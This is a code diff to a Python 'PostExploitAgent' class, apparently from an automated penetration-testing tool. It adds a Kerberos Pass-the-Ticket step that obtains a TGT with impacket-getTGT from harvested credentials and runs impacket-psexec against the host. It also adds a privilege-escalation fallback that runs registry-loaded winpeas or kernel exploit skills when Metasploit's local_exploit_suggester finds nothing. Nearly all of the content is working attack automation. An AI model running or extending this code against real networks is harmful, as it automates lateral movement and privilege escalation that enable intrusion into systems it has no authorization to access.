@@ -1085,6 +1085,36 @@ class PostExploitAgent:
                     except Exception as e:
                         logger.debug(f"[PostAgent] impacket-wmiexec {host}: {e}")
 
+            # ── Pass-the-Ticket (Kerberos) ──
+            if password and "/" not in host and not any(
+                s.get("host") == host and s.get("method", "").startswith("pass_the_ticket")
+                for s in lateral_successes
+            ):
+                try:
+                    domain = os.getenv("DOMAIN", host.upper())
+                    tgt_result = await self.executor.run(
+                        tool="impacket-getTGT",
+                        args=[f"{domain}/{user}:{password}", "-dc-ip", host],
+                        timeout=30, task_id=task_id,
+                    )
+                    if tgt_result.success and "ccache" in (tgt_result.stdout or "").lower():
+                        ccache_path = "/tmp/krb5cc_pentest"
+                        await self.executor.run_script(
+                            script_content=(
+                                f'export KRB5CCNAME={ccache_path}; '
+                                f'impacket-psexec -k -no-pass {domain}/{user}@{host} whoami'
+                            ),
+                            timeout=30, task_id=task_id,
+                        )
+                        lateral_successes.append({
+                            "host": host, "user": user, "method": "pass_the_ticket",
+                            "output": (tgt_result.stdout or "")[:500],
+                        })
+                        await self._log(log_callback, f"[PostAgent] ✅ Pass-the-Ticket 成功: {user}@{host}")
+                        continue
+                except Exception as e:
+                    logger.debug(f"[PostAgent] pass-the-ticket {host}: {e}")
+
         findings["lateral_successes"] = lateral_successes
         findings.setdefault("discovered_hosts", lateral_hosts[:20])
         return {"status": "ok", "lateral_hosts": lateral_hosts, "findings": findings}
@@ -1574,11 +1604,68 @@ class PostExploitAgent:
         output = await self._run_post_module(
             session_id, "post/multi/recon/local_exploit_suggester"
         )
+        msf_success = "exploitable" in output.lower()
+
+        if not msf_success:
+            skill_result = await self._try_skill_privesc(
+                target_os="windows",
+                rce_template=None,
+                task_id=None,
+            )
+            if skill_result.get("success"):
+                return {
+                    "method": "skill_engine_windows",
+                    "output": skill_result.get("output", "")[:500],
+                    "success": True,
+                }
+
         return {
             "method": "local_exploit_suggester",
             "output": output[:500],
-            "success": "exploitable" in output.lower(),
+            "success": msf_success,
         }
+
+    async def _try_skill_privesc(
+        self,
+        target_os: str,
+        rce_template: Optional[str] = None,
+        task_id: Optional[str] = None,
+    ) -> dict[str, Any]:
+        """Attempt privesc via SkillRegistry + SkillEngine for non-MSF paths."""
+        try:
+            from backend.skills.registry import SkillRegistry
+            from backend.skills.engine import SkillEngine
+            from backend.agents.models import VulnFinding
+
+            registry = SkillRegistry()
+            registry.ensure_loaded()
+            privesc_skills = registry.list_by_phase("privesc")
+            os_keywords = {"windows": ["windows", "winpeas"], "linux": ["linux", "kernel"]}
+            target_skills = [
+                s for s in privesc_skills
+                if any(kw in s.skill_id.lower() for kw in os_keywords.get(target_os.lower(), []))
+            ]
+            if not target_skills:
+                return {"success": False, "output": "no matching skills"}
+
+            for skill in target_skills[:2]:
+                synth = VulnFinding(
+                    name=f"Post-Exploit Privesc ({skill.skill_id})",
+                    severity="high",
+                    target="localhost",
+                    description=f"Post-exploitation {target_os} privesc via {skill.skill_id}",
+                    evidence="",
+                    exploitable=True,
+                    tool="post_agent_privesc",
+                )
+                engine = SkillEngine()
+                result = await engine.execute(skill=skill, finding=synth, target_url="")
+                if result and result.success:
+                    return {"success": True, "output": result.evidence[:500]}
+            return {"success": False, "output": "all skills failed"}
+        except Exception as e:
+            logger.debug(f"[PostAgent] Skill privesc fallback failed: {e}")
+            return {"success": False, "output": str(e)[:200]}
 
     async def _run_post_module(self, session_id: str, module_path: str) -> str:
         try:
